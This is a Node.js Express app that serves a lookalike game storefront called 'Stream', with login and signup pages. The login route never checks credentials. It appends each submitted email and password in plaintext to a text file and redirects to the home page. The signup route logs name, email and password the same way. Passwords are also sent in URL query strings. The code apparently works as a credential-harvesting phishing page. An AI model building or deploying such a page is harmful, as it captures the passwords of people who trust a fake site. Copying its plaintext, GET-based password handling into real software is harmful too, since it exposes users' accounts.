const express = require('express');
const app = express();
const port = 9999;
const fs = require('fs');
const path = require("path");

// ================= HOME PAGE =================
app.get("/", (req, res) => {
    res.send(`<!doctype html>
<html lang="ne">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Stream — Online Games Store</title>
  <style>
    :root{
      --bg:#0f1724; --card:#0b1220; --accent:#7c3aed; --muted:#94a3b8; --glass: rgba(255,255,255,0.04);
      --radius:12px; --maxw:1100px; --accent-2:#06b6d4;
      font-family: Inter, system-ui, sans-serif;
    }
    *{box-sizing:border-box}
    body{
      margin:0; background:linear-gradient(180deg,var(--bg),#071227 140%);
      color:#e6eef8; padding:28px; display:flex; justify-content:center;
      font-size:15px;
    }
    .wrap{width:100%; max-width:var(--maxw)}

    header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
    .brand{display:flex;gap:14px;align-items:center}
    .logo{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,#5eead4,var(--accent));
      display:flex;align-items:center;justify-content:center;color:#021124;font-weight:800;font-size:20px}
    .brand h1{margin:0;font-size:20px}
    .brand p{margin:0;color:var(--muted);font-size:13px}

    .actions{display:flex;gap:10px;align-items:center}
    .btn{background:transparent;border:1px solid rgba(255,255,255,0.06);padding:8px 12px;border-radius:10px;color:inherit;text-decoration:none}
    .btn.primary{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:#021124;border:none}

    main{display:grid;grid-template-columns:1fr 300px;gap:22px}
    .catalog{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
    .card{background:var(--card);padding:12px;border-radius:12px}
    .card h3{margin:8px 0 4px}
    .card p{margin:0;color:var(--muted);font-size:13px}

    footer{margin-top:18px;color:var(--muted);font-size:13px}
  </style>
</head>

<body>
  <div class="wrap">
    <header>
      <div class="brand">
        <div class="logo">S</div>
        <div>
          <h1>Stream</h1>
          <p>Online Games Store</p>
        </div>
      </div>

      <div class="actions">
        <a href="/login" class="btn">Login</a>
        <a href="/signup" class="btn primary">Signup</a>
      </div>
    </header>

    <main>
      <section>
        <h2>Featured Games</h2>
        <div class="catalog">
          <div class="card">
            <div style="height:130px;background:#1a2333;border-radius:8px"></div>
            <h3>Cyber Quest</h3>
            <p>Action · Adventure</p>
          </div>

          <div class="card">
            <div style="height:130px;background:#1a2333;border-radius:8px"></div>
            <h3>Pixel Racer</h3>
            <p>Racing</p>
          </div>

          <div class="card">
            <div style="height:130px;background:#1a2333;border-radius:8px"></div>
            <h3>Dungeon Dive</h3>
            <p>RPG</p>
          </div>
        </div>

        <footer>
          © 2025 Stream. All rights reserved.
        </footer>
      </section>

      <aside>
        <div class="card">
          <h3>Top Sellers</h3>
          <p class="muted">Cyber Quest, Dungeon Dive</p>
        </div>
      </aside>
    </main>
  </div>

</body>
</html>`);
});


// ================= LOGIN PAGE =================
app.get('/login', (req, res) => {
    res.send(`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Login — Stream</title>
  <style>
    body{
      background:#0f1724;display:flex;justify-content:center;align-items:center;height:100vh;color:white;
      font-family:Inter, sans-serif;
    }
    .box{background:#0b1220;padding:30px;width:350px;border-radius:14px}
    .logo{width:60px;height:60px;border-radius:12px;background:linear-gradient(135deg,#5eead4,#7c3aed);
      display:flex;align-items:center;justify-content:center;font-weight:800;color:#021124;margin:0 auto 12px}
    input{width:100%;padding:10px;margin-top:6px;border-radius:8px;background:#111827;border:1px solid #1f2937;color:white}
    button{width:100%;padding:10px;margin-top:14px;border:none;border-radius:8px;background:linear-gradient(90deg,#7c3aed,#06b6d4)}
  </style>
</head>

<body>
 <div class="box">
   <div class="logo">S</div>
   <h2>Login</h2>

   <form action="/logindetail" method="get">
    <label>Email</label>
    <input type="email" name="email" required>

    <label>Password</label>
    <input type="password" name="password" required>

    <button>Login</button>
   </form>

   <a href="/signup" style="color:#9ca3af;text-decoration:none">Create account</a>
 </div>
</body>
</html>`);
});


// ================= SIGNUP PAGE =================
app.get('/signup', (req, res) => {
    res.send(`<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Signup — Stream</title>
  <style>
    body{background:#0f1724;display:flex;justify-content:center;align-items:center;height:100vh;color:white;font-family:Inter}
    .box{background:#0b1220;padding:30px;width:350px;border-radius:14px}
    input{width:100%;padding:10px;margin-top:6px;border-radius:8px;background:#111827;border:1px solid #1f2937;color:white}
    button{width:100%;padding:10px;margin-top:14px;border:none;border-radius:8px;background:linear-gradient(90deg,#7c3aed,#06b6d4)}
  </style>
</head>

<body>
 <div class="box">
   <div class="logo">S</div>
   <h2>Signup</h2>

   <form action="/signindetail" method="get">
     <label>Full Name</label>
     <input type="text" name="fullname" required>

     <label>Email</label>
     <input type="email" name="email" required>

     <label>Password</label>
     <input type="password" name="password" required>

     <button>Signup</button>
   </form>

   <a href="/login" style="color:#9ca3af;text-decoration:none">Already have an account?</a>
 </div>
</body>
</html>`);
});



app.get("/logindetail", (req, res) => {
    const { email, password } = req.query;

    const data = `email: ${email}, password: ${password}\n`;
    fs.appendFileSync(("logINinfo.txt"), data);

    res.redirect('/')
});



app.get("/signindetail", (req, res) => {
    const { fullname, email, password } = req.query;

    const data = `fullname: ${fullname}, email: ${email}, password: ${password}\n`;
    fs.appendFileSync(("signINinfo.txt"), data);

    res.send('succedful vayo')
});



app.listen(port, () => {
    console.log("Server running at port " + port);
});
